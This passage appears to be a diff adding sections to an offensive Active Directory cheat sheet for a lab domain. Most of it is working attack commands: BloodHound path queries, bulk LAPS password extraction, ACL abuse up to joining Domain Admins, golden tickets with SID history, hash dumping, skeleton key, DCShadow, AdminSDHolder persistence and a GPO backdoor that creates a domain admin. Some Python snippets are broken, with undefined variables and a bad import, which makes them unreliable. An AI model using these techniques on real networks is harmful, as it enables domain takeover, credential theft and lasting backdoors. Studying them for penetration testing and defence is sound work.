@@ -763,3 +763,433 @@ crackmapexec ldap 10.10.0.1 -u userlist.txt -p 'Welcome123!' --no-bruteforce
 # Check for password policies first
 crackmapexec smb 10.10.0.1 -u 'svc_ldap' -p 'Password123!' --pass-pol
 ```
+
+---
+
+## 12. Advanced BloodHound Cypher Queries
+
+### 12.1 Shortest Attack Paths to Domain Admins
+
+```cypher
+// Find shortest path from any user to Domain Admins
+MATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ForceChangePassword*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
+RETURN p
+
+// Find all paths to Domain Admins from a specific user
+MATCH p=allShortestPaths((u:User {name:"SVC_LDAP@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
+RETURN p
+
+// Find users with most attack paths (high-value targets for defense)
+MATCH (u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN u.name, count(*) AS path_count
+ORDER BY path_count DESC
+LIMIT 20
+
+// Find computers where Domain Admins have active sessions
+MATCH (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:MemberOf*1..]->(u:User)-[:HasSession]->(c:Computer)
+RETURN u.name, c.name
+
+// Find kerberoastable users with admin rights
+MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer)
+RETURN u.name, c.name
+```
+
+### 12.2 ACL Abuse Path Discovery
+
+```cypher
+// Find all users who can DCSync (has Replication privileges)
+MATCH (u:User)-[:GenericAll|WriteDacl|WriteOwner]->(d:Domain)
+RETURN u.name
+
+// Find users with GenericAll on other users
+MATCH (u1:User)-[:GenericAll]->(u2:User)
+RETURN u1.name, u2.name
+
+// Find users who can reset passwords of other users
+MATCH (u1:User)-[:ForceChangePassword]->(u2:User)
+RETURN u1.name, u2.name
+
+// Find all GenericWrite relationships (ACL exploitation)
+MATCH p=(u:User)-[:GenericWrite]->(t)
+RETURN p
+
+// Find WriteDacl relationships on Groups (for group membership manipulation)
+MATCH (u:User)-[:WriteDacl]->(g:Group)
+RETURN u.name, g.name
+
+// Find users with WriteOwner on high-value targets
+MATCH (u:User)-[:WriteOwner]->(t)
+WHERE t:User OR t:Group OR t:Computer
+RETURN u.name, t.name, labels(t)[0]
+```
+
+### 12.3 Delegation Attack Path Analysis
+
+```cypher
+// Find all computers with unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true})
+RETURN c.name
+
+// Find constrained delegation paths to Domain Controllers
+MATCH p=(c:Computer)-[:AllowedToDelegate]->(t:Computer)
+WHERE t.name CONTAINS "DC0"
+RETURN p
+
+// Find resource-based constrained delegation (RBCD) opportunities
+MATCH (u:User)-[:WriteComputerAccount|GenericAll]->(c:Computer)
+RETURN u.name, c.name
+
+// Find delegation chains that lead to Domain Admin
+MATCH p=(c1:Computer)-[:AllowedToDelegate*1..]->(c2:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN p
+```
+
+---
+
+## 13. LAPS Password Extraction
+
+### 13.1 LAPS Enumeration and Access
+
+```bash
+# Check if LAPS is installed in the domain
+# Look for the ms-Mcs-AdmPwdExpirationTime attribute on computer objects
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(ms-Mcs-AdmPwdExpirationTime=*)" cn ms-Mcs-AdmPwdExpirationTime
+
+# Check who can read LAPS passwords (ms-Mcs-AdmPwd attribute)
+# Requires ACL enumeration
+ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 acl
+
+# Enumerate LAPS password readers with PowerView (from Windows)
+# Get-ObjectAcl -Identity "COMPUTER$" -ResolveGUIDs | ? {$_.ObjectName -like 'ms-Mcs-AdmPwd'}
+```
+
+### 13.2 LAPS Password Extraction with Impacket
+
+```bash
+# Read LAPS password using LDAP query (requires ms-Mcs-AdmPwd read permission)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_laps_reader" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(ms-Mcs-AdmPwd=*)" cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
+
+# Read LAPS password with CrackMapExec
+crackmapexec ldap 10.10.0.1 -u svc_laps_reader -p 'Password123!' --laps
+
+# Bulk LAPS password extraction across all computers
+for computer in $(ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_laps_reader" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=computer)" dn | grep "^dn:" | awk '{print $2}'); do
+  ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_laps_reader" -w 'Password123!' -b "$computer" "(objectClass=computer)" cn ms-Mcs-AdmPwd 2>/dev/null | grep -A1 "ms-Mcs-AdmPwd"
+done
+```
+
+### 13.3 LAPS Password Reset Exploitation
+
+```bash
+# If you have permission to reset LAPS passwords (Write on ms-Mcs-AdmPwdExpirationTime)
+# Force password expiration to trigger new password generation
+
+# Set the expiration time to the past to force reset
+python3 << 'PYEOF'
+from ldap3 import Server, Connection, MODIFY_REPLACE
+server = Server("ldap://10.10.0.1")
+conn = Connection(server, "CORP\\svc_user", "Password123!", auto_bind=True)
+# Set expiration to 0 to force immediate reset
+conn.modify("CN=TARGET-PC,CN=Computers,DC=corp,DC=local", {
+    "ms-Mcs-AdmPwdExpirationTime": [(MODIFY_REPLACE, ["0"])]
+})
+print(f"Modified: {conn.result}")
+PYEOF
+
+# After the password is reset, read the new password
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_laps_reader" -w 'Password123!' -b "CN=TARGET-PC,CN=Computers,DC=corp,DC=local" ms-Mcs-AdmPwd
+```
+
+---
+
+## 14. ACL Abuse Techniques
+
+### 14.1 GenericAll on User Account
+
+```bash
+# If you have GenericAll on a user, reset their password
+# Using net (Samba) to reset password
+net rpc password target_user 'NewPassword123!' -S dc01.corp.local -U 'corp\attacker_user%Password123!'
+
+# Using impacket to change password
+impacket-changepasswd 'corp.local/target_user:old_password@dc01.corp.local' -newpass 'NewPassword123!'
+
+# Using PowerView (from Windows)
+# Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
+```
+
+### 14.2 GenericAll on Computer Account (RBCD)
+
+```bash
+# Resource-Based Constrained Delegation (RBCD) exploitation
+# If you have GenericAll on a computer account, configure RBCD
+
+# Step 1: Create a new machine account (if ms-DS-MachineAccountQuota > 0)
+impacket-addcomputer 'corp.local/attacker_user:Password123!' -computer-name 'FAKEPC$' -computer-pass 'FakePass123!'
+
+# Step 2: Configure RBCD on the target computer to trust the new machine
+python3 << 'PYEOF'
+from ldap3 import Server, Connection, MODIFY_REPLACE
+import ldaptypes
+server = Server("ldap://10.10.0.1")
+conn = Connection(server, "CORP\\attacker_user", "Password123!", auto_bind=True)
+# Set msDS-AllowedToActOnBehalfOfOtherIdentity with the fake computer's SID
+conn.modify("CN=TARGET-PC,CN=Computers,DC=corp,DC=local", {
+    "msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, [rbcd_sd_bytes])]
+})
+PYEOF
+
+# Step 3: Get a service ticket impersonating an admin
+impacket-getST -spn cifs/target-pc.corp.local -impersonate administrator 'corp.local/FAKEPC$:FakePass123!'
+
+# Step 4: Use the ticket for access
+export KRB5CCNAME=administrator.ccache
+impacket-psexec corp.local/administrator@target-pc.corp.local -k -no-pass
+```
+
+### 14.3 WriteDacl on Group
+
+```bash
+# If you have WriteDacl on a group, grant yourself membership
+# Step 1: Grant yourself GenericAll on the group
+python3 << 'PYEOF'
+from ldap3 import Server, Connection, MODIFY_REPLACE
+server = Server("ldap://10.10.0.1")
+conn = Connection(server, "CORP\\attacker_user", "Password123!", auto_bind=True)
+# Modify DACL to grant GenericAll
+conn.modify("CN=Domain Admins,CN=Users,DC=corp,DC=local", {
+    "nTSecurityDescriptor": [(MODIFY_REPLACE, [new_sd_bytes])]
+})
+PYEOF
+
+# Step 2: Add yourself to the group
+net rpc group addmem "Domain Admins" attacker_user -S dc01.corp.local -U 'corp\attacker_user%Password123!'
+
+# Or use ldapmodify to add to group
+ldapmodify -x -H ldap://10.10.0.1 -D "CORP\\attacker_user" -w 'Password123!' << 'LDAPEOF'
+dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
+changetype: modify
+add: member
+member: CN=attacker_user,CN=Users,DC=corp,DC=local
+LDAPEOF
+```
+
+### 14.4 WriteOwner Exploitation
+
+```bash
+# If you have WriteOwner on an object, take ownership then modify it
+# Step 1: Take ownership
+python3 << 'PYEOF'
+from ldap3 import Server, Connection, MODIFY_REPLACE
+server = Server("ldap://10.10.0.1")
+conn = Connection(server, "CORP\\attacker_user", "Password123!", auto_bind=True)
+conn.modify("CN=Target Group,CN=Users,DC=corp,DC=local", {
+    "owner": [(MODIFY_REPLACE, ["CN=attacker_user,CN=Users,DC=corp,DC=local"])]
+})
+PYEOF
+
+# Step 2: Now that you own the object, grant yourself full control (WriteDacl)
+# Step 3: Add yourself to the group
+net rpc group addmem "Target Group" attacker_user -S dc01.corp.local -U 'corp\attacker_user%Password123!'
+```
+
+---
+
+## 15. Shadow Admin Detection
+
+### 15.1 Identifying Shadow Admins via LDAP
+
+```bash
+# Find users with AdminCount=1 (current or former privileged accounts)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(&(objectClass=user)(adminCount=1))" sAMAccountName adminCount
+
+# Find users with AdminCount=1 who are NOT in Domain Admins
+# These are shadow admins -- they have protected SDs but no visible admin group membership
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(&(objectClass=user)(adminCount=1)(!(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)))" sAMAccountName memberOf
+
+# Find users with SIDHistory (potential hidden privileges)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(sIDHistory=*)" sAMAccountName sIDHistory
+
+# Find service accounts with excessive privileges
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(&(objectClass=user)(servicePrincipalName=*)(adminCount=1))" sAMAccountName servicePrincipalName
+```
+
+### 15.2 Shadow Admin Detection with BloodHound
+
+```cypher
+// Find users with AdminCount=1 but not in Domain Admins
+MATCH (u:User {admincount:true})
+WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN u.name, u.admincount
+
+// Find users with direct admin rights on computers but not in admin groups
+MATCH (u:User)-[:AdminTo]->(c:Computer)
+WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN u.name, c.name
+
+// Find users with DCSync rights who are not Domain Admins
+MATCH (u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
+WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN u.name
+```
+
+### 15.3 Detecting Hidden Group Membership
+
+```bash
+# Enumerate nested group membership (users with indirect Domain Admin)
+for user in $(ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName | grep "^sAMAccountName:" | awk '{print $2}'); do
+  groups=$(ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(sAMAccountName=$user)" memberOf | grep "^memberOf:" | grep -i "admin")
+  if [ -n "$groups" ]; then
+    echo "[ADMIN USER] $user"
+    echo "$groups"
+  fi
+done
+```
+
+---
+
+## 16. Forest and Domain Trust Exploitation
+
+### 16.1 Trust Enumeration and Analysis
+
+```bash
+# Enumerate all domain trusts
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(objectClass=trustedDomain)" cn trustDirection trustType trustAttributes flatName
+
+# Enumerate trusts with ldeep
+ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 trusts
+
+# Check for external trusts (potential attack path)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(&(objectClass=trustedDomain)(trustAttributes:1.2.840.113556.1.4.803:=3))" cn
+
+# Check for forest trusts (cross-forest attack paths)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" \
+  "(&(objectClass=trustedDomain)(trustType=2))" cn trustDirection
+
+# Check for SID filtering status (if disabled, SID history injection works)
+crackmapexec smb 10.10.0.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx' --trusted-for-delegation
+```
+
+### 16.2 Cross-Forest Kerberoasting
+
+```bash
+# Kerberoast across forest trusts
+# Request TGS tickets for service accounts in trusted forest
+impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -target-domain trusted.local -request -outputfile cross_forest_tgs.txt
+
+# Crack cross-forest TGS hashes
+hashcat -m 13100 cross_forest_tgs.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 16.3 SID History Injection for Cross-Domain Escalation
+
+```bash
+# Forge ticket with SID History for cross-domain privilege escalation
+# Requires krbtgt hash from the child domain
+
+# Step 1: Forge Golden Ticket with Enterprise Admin SID in ExtraSID
+impacket-ticketer -nthash 'child_krbtgt_hash' \
+  -domain-sid S-1-5-21-CHILD_DOMAIN_SID \
+  -domain child.corp.local \
+  -extra-sid S-1-5-21-PARENT_DOMAIN_SID-519 \
+  administrator
+
+# Step 2: Use the ticket to access parent domain
+export KRB5CCNAME=administrator.ccache
+impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass -target-ip 10.10.0.1
+
+# Step 3: Dump parent domain hashes
+impacket-secretsdump corp.local/administrator@dc01.corp.local -k -no-pass -just-dc-ntlm
+```
+
+---
+
+## 17. AD Persistence and Stealth Techniques
+
+### 17.1 Skeleton Key Attack
+
+```bash
+# Skeleton Key injection via Mimikatz (requires Domain Admin + DC access)
+# Injects a master password "skeleton" into the DC's LSASS
+# Users can still use their normal passwords PLUS the skeleton key
+# mimikatz # misc::skeleton
+
+# After injection, authenticate as any user with the skeleton key
+impacket-psexec 'corp.local/administrator:skeleton@dc01.corp.local'
+# Or use the skeleton password alongside normal credentials
+crackmapexec smb dc01.corp.local -u administrator -p 'skeleton'
+```
+
+### 17.2 DCShadow Attack
+
+```bash
+# DCShadow -- create a fake Domain Controller to push arbitrary changes
+# Requires Domain Admin privileges
+# Step 1: Register a fake DC (via mimikatz on the attacking machine)
+# mimikatz # !+ (start DLL injection into lsass)
+# mimikets # privilege::debug
+# mimikatz # lsadump::dcshadow /object:CN=attacker_user,CN=Users,DC=corp,DC=local /attribute:userAccountControl /value:512
+
+# Step 2: Push changes (from a second mimikatz instance)
+# mimikatz # lsadump::dcshadow /push
+
+# Using Impacket for similar operations (add SPN to user)
+python3 << 'PYEOF'
+from impacket.ldap import ldaptypes
+from impacket.ldap.ldap import LDAPConnection
+# Modify user attributes via LDAP with admin privileges
+# Add SPN to user for Kerberoasting: set servicePrincipalName
+PYEOF
+```
+
+### 17.3 AdminSDHolder Persistence
+
+```bash
+# AdminSDHolder is a container that acts as a template for privileged accounts
+# Any ACE added to AdminSDHolder is propagated to all protected accounts
+
+# Add GenericAll ACE for attacker to AdminSDHolder
+# Using PowerView (Windows):
+# Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity attacker_user -Rights All
+
+# Using ldapmodify (Linux):
+ldapmodify -x -H ldap://10.10.0.1 -D "CORP\\administrator" -w 'P@ssw0rd!' << 'LDAPEOF'
+dn: CN=AdminSDHolder,CN=System,DC=corp,DC=local
+changetype: modify
+add: nTSecurityDescriptor
+nTSecurityDescriptor:< file://acl_with_genericall.bin
+LDAPEOF
+
+# Verify propagation (may take up to 60 minutes by default)
+ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
+  -b "CN=Domain Admins,CN=Users,DC=corp,DC=local" nTSecurityDescriptor
+```
+
+### 17.4 GPO Backdoor Persistence
+
+```bash
+# Create a GPO that runs a script on every machine in the OU
+# Using Impacket SMBClient to modify GPO scripts
+impacket-smbclient 'corp.local/administrator:P@ssw0rd!@dc01.corp.local'
+
+# Upload a script to the GPO startup scripts folder
+# Path: \\corp.local\SYSVOL\corp.local\Policies\{GUID}\MACHINE\Scripts\Startup\
+put backdoor.bat "Startup\backdoor.bat"
+
+# The backdoor.bat content:
+# @echo off
+# net user backdoor P@ssw0rd! /add /domain
+# net group "Domain Admins" backdoor /add /domain
+
+# Alternative: Scheduled Task via GPO Preferences
+# Edit \\corp.local\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+# Add an Immediate Task that runs on next Group Policy refresh
+```
